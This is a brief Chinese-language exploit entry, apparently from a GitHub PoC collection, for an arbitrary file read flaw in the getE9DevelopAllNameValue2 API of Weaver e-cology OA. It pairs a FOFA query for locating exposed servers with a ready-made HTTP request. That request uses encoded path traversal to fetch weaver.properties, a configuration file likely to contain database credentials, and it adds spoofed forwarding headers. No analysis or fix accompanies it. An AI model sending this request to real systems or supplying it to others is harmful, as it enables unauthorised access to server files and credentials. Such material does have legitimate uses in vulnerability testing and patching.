## 泛微getE9DevelopAllNameValue2接口存在任意文件读取漏洞

## fofa
```
app="泛微-OA（e-cology）"
```

## poc
```
GET /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: */*
Connection: Keep-Alive
X-Forwarded-For: 127.0.0.1
X-Originating: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

![24965e54432f0dbd1db6d0eb73fd7aa5](https://github.com/wy876/POC/assets/139549762/c4c5a948-191f-4749-8136-a9f1576c4816)
